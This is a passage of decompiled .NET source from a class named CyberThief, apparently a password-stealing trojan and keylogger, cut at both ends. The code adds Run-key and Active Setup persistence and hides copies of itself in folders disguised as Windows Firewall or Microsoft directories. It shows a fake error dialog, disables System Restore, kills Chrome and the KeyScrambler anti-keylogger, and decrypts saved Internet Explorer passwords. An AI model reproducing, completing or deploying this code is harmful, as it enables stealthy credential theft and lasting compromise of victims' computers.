        RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
label_6:
        num3 = 7;
        registryKey1.SetValue(this.RegistryCU, (object) this.TheGodPath);
label_7:
        num3 = 8;
        registryKey1.Close();
label_8:
        num3 = 11;
        if (!this.RegLM)
          goto label_20;
label_9:
        num3 = 12;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "RegRead", new object[1]
        {
          (object) ("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run\\" + this.RegistryLM)
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_10:
        num3 = 13;
        if (Information.Err().Number == 0)
          goto label_20;
label_11:
        num3 = 14;
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
label_12:
        num3 = 15;
        registryKey2.SetValue(this.RegistryLM, (object) this.TheGodPath);
label_13:
        num3 = 16;
        registryKey2.Close();
        goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
              case 10:
              case 11:
                goto label_8;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
                goto label_13;
              case 17:
              case 18:
              case 19:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void WereDoICopy()
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TheGodPath, "AppData", false) == 0)
        this.TheGodPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft\\CurrentVersion\\" + this.FileName;
      else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TheGodPath, "Windows", false) == 0)
        this.TheGodPath = Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall\\" + this.FileName;
      else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TheGodPath, "System", false) == 0)
        this.TheGodPath = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default\\" + this.FileName;
      else
        this.TheGodPath = this.TheGodPath + "\\" + this.FileName;
    }

    public void FindInfectionPath()
    {
      if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local"))
        this.OldInfectionLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft\\CurrentVersion\\" + this.FileName;
      else if (Directory.Exists(Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall"))
        this.OldInfectionLocation = Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall\\" + this.FileName;
      else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default"))
        this.OldInfectionLocation = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default\\" + this.FileName;
      else
        this.OldInfectionLocation = "";
    }

    public object CanISeeAnyFolder()
    {
label_0:
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (!Directory.Exists(this.FolderFromFileName(this.TheGodPath)))
          goto label_4;
label_2:
        num3 = 3;
        this.OldInfectionLocation = this.TheGodPath;
label_3:
        num3 = 4;
        obj1 = (object) true;
        goto label_21;
label_4:
        num3 = 6;
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local"))
          goto label_7;
label_5:
        num3 = 7;
        this.OldInfectionLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft\\CurrentVersion\\" + this.FileName;
label_6:
        num3 = 8;
        obj1 = (object) true;
        goto label_21;
label_7:
        num3 = 10;
        if (!Directory.Exists(Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall"))
          goto label_10;
label_8:
        num3 = 11;
        this.OldInfectionLocation = Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall\\" + this.FileName;
label_9:
        num3 = 12;
        obj1 = (object) true;
        goto label_21;
label_10:
        num3 = 14;
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default"))
          goto label_13;
label_11:
        num3 = 15;
        this.OldInfectionLocation = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default\\" + this.FileName;
label_12:
        num3 = 16;
        obj1 = (object) true;
        goto label_21;
label_13:
        num3 = 18;
label_14:
        num3 = 19;
        obj1 = (object) false;
        goto label_21;
label_16:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 13:
              case 17:
              case 20:
              case 21:
                goto label_21;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 10:
                goto label_7;
              case 11:
                goto label_8;
              case 12:
                goto label_9;
              case 14:
                goto label_10;
              case 15:
                goto label_11;
              case 16:
                goto label_12;
              case 18:
                goto label_13;
              case 19:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public object AmIRunningInfectionDir() => Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Application.ExecutablePath, this.TheGodPath, false) == 0 ? (object) true : (object) false;

    public void FakeErrorMessage()
    {
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.ErrorIcon, "X", false) == 0)
      {
        int num1 = (int) Interaction.MsgBox((object) this.ErrorMessage, MsgBoxStyle.Critical, (object) this.ErrorTitle);
      }
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.ErrorIcon, "!", false) == 0)
      {
        int num2 = (int) Interaction.MsgBox((object) this.ErrorMessage, MsgBoxStyle.Exclamation, (object) this.ErrorTitle);
      }
      if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.ErrorIcon, "?", false) != 0)
        return;
      int num3 = (int) Interaction.MsgBox((object) this.ErrorMessage, MsgBoxStyle.Information, (object) this.ErrorTitle);
    }

    public void WriteMutexToReg()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Windows Firewall");
label_2:
        num3 = 3;
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Windows Firewall\\", true);
label_3:
        num3 = 4;
        registryKey.SetValue("ActiveX DLL Setup", (object) this.MutexNumber);
label_4:
        num3 = 5;
        registryKey.Close();
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public object ReadMutexInReg(string mutex)
    {
label_0:
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Windows Firewall\\", true);
label_2:
        num3 = 3;
        string Right = Conversions.ToString(registryKey.GetValue("ActiveX DLL Setup"));
label_3:
        num3 = 4;
        registryKey.Close();
label_4:
        num3 = 5;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(mutex, Right, false) != 0)
          goto label_6;
label_5:
        num3 = 6;
        obj1 = (object) true;
        goto label_14;
label_6:
        num3 = 8;
label_7:
        num3 = 9;
        obj1 = (object) false;
        goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 10:
              case 11:
                goto label_14;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public void IsItInfected()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (!Conversions.ToBoolean(Microsoft.VisualBasic.CompilerServices.Operators.AndObject(Microsoft.VisualBasic.CompilerServices.Operators.AndObject(Microsoft.VisualBasic.CompilerServices.Operators.CompareObjectEqual(this.AmIRunningInfectionDir(), (object) false, false), (object) (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.DoIError, "Yes", false) == 0)), (object) (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\{452252}-{521111}-{251111}.exe", false) != 0))))
          goto label_3;
label_2:
        num3 = 3;
        this.FakeErrorMessage();
label_3:
        num3 = 5;
        if (!(this.MeltFile & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\{452252}-{521111}-{251111}.exe", false) != 0))
          goto label_6;
label_4:
        num3 = 6;
        this.MeltPrime();
label_5:
        num3 = 7;
        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\{452252}-{521111}-{251111}.exe");
        ProjectData.EndApp();
label_6:
        num3 = 10;
        if (!this.DelayInfection)
          goto label_8;
label_7:
        num3 = 11;
        Thread.Sleep(this.DelayTime);
label_8:
        num3 = 13;
        if (!Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(this.CanISeeAnyFolder(), (object) false, false))
          goto label_13;
label_9:
        num3 = 14;
        if (!this.DoISteal)
          goto label_11;
label_10:
        num3 = 15;
        this.Installation();
label_11:
        num3 = 17;
        if (this.DoISteal)
          goto label_35;
label_12:
        num3 = 18;
        this.KeylogOnlyInstallation();
        goto label_35;
label_13:
        num3 = 22;
        if (!Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(this.CanISeeAnyFolder(), (object) true, false))
          goto label_35;
label_14:
        num3 = 23;
        if (!Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(this.AmIRunningInfectionDir(), (object) false, false))
          goto label_27;
label_15:
        num3 = 24;
        if (this.BotKiller)
          goto label_17;
label_16:
        num3 = 25;
        // ISSUE: explicit finalizer call
        this.Finalize();
        ProjectData.EndApp();
label_17:
        num3 = 28;
        if (!this.BotKiller)
          goto label_27;
label_18:
        num3 = 29;
        if (Microsoft.VisualBasic.CompilerServices.Operators.ConditionalCompareObjectEqual(this.ReadMutexInReg(this.MutexNumber), (object) true, false))
        {
          ProjectData.EndApp();
          goto label_22;
        }
label_20:
        num3 = 32;
label_21:
        num3 = 33;
        this.WriteMutexToReg();
label_22:
        num3 = 35;
        this.BotKill();
label_23:
        num3 = 36;
        if (!this.DoISteal)
          goto label_25;
label_24:
        num3 = 37;
        this.Installation();
label_25:
        num3 = 39;
        if (this.DoISteal)
          goto label_27;
label_26:
        num3 = 40;
        this.KeylogOnlyInstallation();
label_27:
        num3 = 44;
        if (!this.DoIKeylog)
        {
          ProjectData.EndApp();
          goto label_35;
        }
        else
          goto label_35;
label_30:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
              case 9:
              case 10:
                goto label_6;
              case 11:
                goto label_7;
              case 12:
              case 13:
                goto label_8;
              case 14:
                goto label_9;
              case 15:
                goto label_10;
              case 16:
              case 17:
                goto label_11;
              case 18:
                goto label_12;
              case 19:
              case 20:
              case 45:
              case 46:
              case 47:
              case 48:
                goto label_35;
              case 21:
              case 22:
                goto label_13;
              case 23:
                goto label_14;
              case 24:
                goto label_15;
              case 25:
                goto label_16;
              case 26:
              case 27:
              case 28:
                goto label_17;
              case 29:
                goto label_18;
              case 30:
              case 31:
              case 34:
              case 35:
                goto label_22;
              case 32:
                goto label_20;
              case 33:
                goto label_21;
              case 36:
                goto label_23;
              case 37:
                goto label_24;
              case 38:
              case 39:
                goto label_25;
              case 40:
                goto label_26;
              case 41:
              case 42:
              case 43:
              case 44:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_30;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_35:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void CheckInstanceOfApp()
    {
      if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(this.FileName)).Length <= 2)
        return;
      ProjectData.EndApp();
    }

    public void CheckFakeNameApp()
    {
      if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(this.NameOnlyFromFullPath(Application.ExecutablePath))).Length <= 2)
        return;
      ProjectData.EndApp();
    }

    public void CreateDirectory()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TheGodPath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft\\CurrentVersion\\" + this.FileName, false) != 0)
          goto label_6;
label_2:
        num3 = 3;
        MyProject.Computer.FileSystem.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft\\CurrentVersion");
label_3:
        num3 = 4;
        System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local", FileAttributes.Hidden | FileAttributes.System);
label_4:
        num3 = 5;
        System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft", FileAttributes.Hidden | FileAttributes.System);
label_5:
        num3 = 6;
        System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Local\\Microsoft\\CurrentVersion", FileAttributes.Hidden | FileAttributes.System);
        goto label_20;
label_6:
        num3 = 8;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TheGodPath, Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall\\" + this.FileName, false) != 0)
          goto label_9;
label_7:
        num3 = 9;
        MyProject.Computer.FileSystem.CreateDirectory(Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall");
label_8:
        num3 = 10;
        System.IO.File.SetAttributes(Environment.GetEnvironmentVariable("windir") + "\\Windows Firewall", FileAttributes.Hidden | FileAttributes.System);
        goto label_20;
label_9:
        num3 = 12;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TheGodPath, Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default\\" + this.FileName, false) != 0)
          goto label_12;
label_10:
        num3 = 13;
        MyProject.Computer.FileSystem.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default");
label_11:
        num3 = 14;
        System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\Default", FileAttributes.Hidden | FileAttributes.System);
        goto label_20;
label_12:
        num3 = 16;
label_13:
        num3 = 17;
        MyProject.Computer.FileSystem.CreateDirectory(this.FolderFromFileName(this.TheGodPath));
        goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 11:
              case 15:
              case 18:
              case 19:
                goto label_20;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
                goto label_11;
              case 16:
                goto label_12;
              case 17:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void ExeAttributes()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        System.IO.File.SetAttributes(this.TheGodPath, FileAttributes.Hidden | FileAttributes.System);
        goto label_8;
label_3:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void DisableSR()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", nameof (DisableSR), (object) "1", RegistryValueKind.DWord);
        goto label_8;
label_3:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void KillChrome()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName("chrome");
label_2:
        num3 = 3;
        Process[] processArray = processesByName;
        int index = 0;
        goto label_6;
label_4:
        num3 = 4;
        Process process;
        process.Kill();
        checked { ++index; }
label_5:
        num3 = 5;
label_6:
        if (index < processArray.Length)
        {
          process = processArray[index];
          goto label_4;
        }
        else
          goto label_13;
label_8:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void CreateActiveX()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MyProject.Computer.FileSystem.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Firewall");
label_2:
        num3 = 3;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Firewall\\WIN32.exe", UIOption.OnlyErrorDialogs, UICancelOption.DoNothing);
label_3:
        num3 = 4;
        System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Firewall", FileAttributes.Hidden | FileAttributes.System);
label_4:
        num3 = 5;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + this.ActiveXKey, "stubpath", (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows Firewall\\WIN32.exe"));
label_5:
        num3 = 6;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + this.ActiveXKey, "ComponentID", (object) "Windows Firewall");
label_6:
        num3 = 7;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + this.ActiveXKey, "", (object) "Microsoft Windows");
        goto label_13;
label_8:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void GetRidOfScrambler()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, "keyscrambler", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    [DllImport("advapi32.dll")]
    public static extern bool CryptAcquireContext(
      ref IntPtr phProv,
      string pszContainer,
      string pszProvider,
      uint dwProvType,
      uint dwFlags);

    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool CryptGetHashParam(
      IntPtr hHash,
      int param,
      byte[] digest,
      ref int length,
      int flags);

    [DllImport("advapi32.dll")]
    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

    [DllImport("advapi32.dll")]
    public static extern bool CryptDeriveKey(
      IntPtr hProv,
      uint Algid,
      IntPtr hBaseData,
      uint dwFlags,
      ref IntPtr phKey);

    [DllImport("advapi32.dll")]
    public static extern bool CryptCreateHash(
      IntPtr hProv,
      uint Algid,
      IntPtr hKey,
      uint dwFlags,
      ref IntPtr phHash);

    [DllImport("advapi32.dll")]
    public static extern bool CryptHashData(
      IntPtr hHash,
      IntPtr pbData,
      int dwDataLen,
      uint dwFlags);

    [DllImport("advapi32.dll")]
    public static extern bool CryptEncrypt(
      IntPtr hKey,
      IntPtr hHash,
      bool Final,
      uint dwFlags,
      byte[] pbData,
      ref uint pdwDataLen,
      uint dwBufLen);

    [DllImport("advapi32.dll")]
    public static extern bool CryptDecrypt(
      IntPtr hKey,
      IntPtr hHash,
      bool Final,
      uint dwFlags,
      byte[] pbData,
      ref uint pdwDataLen);

    [DllImport("advapi32.dll")]
    public static extern bool CryptDestroyHash(IntPtr hHash);

    [DllImport("advapi32.dll")]
    public static extern bool CryptDestroyKey(IntPtr hKey);

    [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr FindFirstUrlCacheEntry(
      [MarshalAs(UnmanagedType.LPTStr)] string lpszUrlSearchPattern,
      IntPtr lpFirstCacheEntryInfo,
      ref int lpdwFirstCacheEntryInfoBufferSize);

    [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool FindNextUrlCacheEntry(
      IntPtr hEnumHandle,
      IntPtr lpNextCacheEntryInfo,
      ref int lpdwNextCacheEntryInfoBufferSize);

    [DllImport("wininet.dll")]
    public static extern bool FindCloseUrlCache(IntPtr hEnumHandle);

    [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref CyberThief.DATA_BLOB pDataIn,
      int szDataDescr,
      ref CyberThief.DATA_BLOB pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref CyberThief.DATA_BLOB pDataOut);

    public void GetIEPasswords()
    {
      int num1 = 0;
      CyberThief.FindFirstUrlCacheEntry((string) null, IntPtr.Zero, ref num1);
      if (Marshal.GetLastWin32Error() == 259)
        return;
      int cb1 = num1;
      IntPtr num2 = Marshal.AllocHGlobal(cb1);
      try
      {
        IntPtr firstUrlCacheEntry = CyberThief.FindFirstUrlCacheEntry((string) null, num2, ref num1);
        bool flag;
        do
        {
          string lower = ((CyberThief.INTERNET_CACHE_ENTRY_INFO) Marshal.PtrToStructure(num2, typeof (CyberThief.INTERNET_CACHE_ENTRY_INFO))).lpszSourceUrlName.ToLower();
          string str1 = lower.Substring(checked (lower.IndexOf("@") + 1));
          if (str1.IndexOf("?") > 0)
            str1 = str1.Substring(0, str1.IndexOf("?"));
          string shA1Hash1 = CyberThief.GetSHA1Hash(str1, checked (str1.Length + 1 * 2));
          byte[] data1 = (byte[]) Registry.CurrentUser.OpenSubKey(CyberThief.IE_KEY).GetValue(shA1Hash1, (object) null);
          if (data1 != null)
          {
            if (!CyberThief.visited.Contains(str1))
            {
              this.DecryptCredential(str1, shA1Hash1, data1.Length, data1);
              CyberThief.visited = CyberThief.visited + str1 + " ";
            }
          }
          else
          {
            string str2 = str1 + "/";
            string shA1Hash2 = CyberThief.GetSHA1Hash(str2, checked (str2.Length + 1 * 2));
            byte[] data2 = (byte[]) Registry.CurrentUser.OpenSubKey(CyberThief.IE_KEY).GetValue(shA1Hash2, (object) null);
            if (data2 != null && !CyberThief.visited.Contains(str2))
            {
              this.DecryptCredential(str2, shA1Hash2, data2.Length, data2);
              CyberThief.visited = CyberThief.visited + str2 + " ";
            }
          }
          num1 = cb1;
          flag = CyberThief.FindNextUrlCacheEntry(firstUrlCacheEntry, num2, ref num1);
          if ((flag || Marshal.GetLastWin32Error() != 259) && !flag && num1 > cb1)
          {
            cb1 = num1;
            IntPtr cb2 = new IntPtr(cb1);
            num2 = Marshal.ReAllocHGlobal(num2, cb2);
            flag = true;
          }
        }
        while (flag);
      }
      finally
      {
        Marshal.FreeHGlobal(num2);
      }
      Console.ReadLine();
    }

    public static string GetSHA1Hash(string pbData, int length)
    {
      byte[] digest = new byte[21];
      string s = "";
      int length1 = 20;
      IntPtr phProv;
      CyberThief.CryptAcquireContext(ref phProv, (string) null, (string) null, 1U, 0U);
      IntPtr phHash;
      CyberThief.CryptCreateHash(phProv, 32772U, IntPtr.Zero, 0U, ref phHash);
      CyberThief.CryptHashData(phHash, CyberThief.VarPtr((object) pbData), length, 0U);
      CyberThief.CryptGetHashParam(phHash, 2, digest, ref length1, 0);
      CyberThief.CryptDestroyHash(phHash);
      CyberThief.CryptReleaseContext(phProv, 0U);
      int location = 0;
      while (location < 20)
      {
        s += Strings.Right("00" + digest[location].ToString("X"), 2);
        Math.Max(Interlocked.Increment(ref location), checked (location - 1));
      }
      return s + Strings.Right("00" + CyberThief.CheckSum(s).ToString("X"), 2);
    }

    public static byte CheckSum(string s)
